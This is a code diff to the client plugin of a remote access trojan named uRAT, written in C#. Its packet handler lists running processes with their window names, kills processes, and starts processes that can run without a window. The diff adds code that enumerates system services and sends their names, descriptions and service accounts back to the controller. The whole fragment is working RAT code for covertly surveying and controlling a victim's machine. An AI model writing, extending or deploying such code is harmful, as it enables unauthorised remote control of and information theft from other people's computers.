@@ -19,7 +19,7 @@ namespace uRAT.ManagersClientPlugin.ProcessManager.Operations
             {
                 foreach (var proc in ProcessHelper.GetRunningProcesses())
                 {
-                    SendPacket(new ProcessInformationPacket(proc.ProcessName, proc.Pid, proc.IsThis, proc.MemUsage));
+                    SendPacket(new ProcessInformationPacket(proc.ProcessName, proc.Pid, proc.IsThis, proc.WindowName));
                 }
             } 
             else if (packet is KillProcessPacket)
@@ -34,6 +34,14 @@ namespace uRAT.ManagersClientPlugin.ProcessManager.Operations
                     Filename = startProcPacket.Filename,
                     NoWindow = startProcPacket.NoWindow
                 });
+            }
+            else if (packet is RefreshServicesPacket)
+            {
+                foreach (var service in ServicesHelper.GetServices())
+                {
+                    SendPacket(new ServiceInformationPacket(service.Service, service.DisplayName, service.Startname,
+                        service.Description));
+                }
             }
             
         }
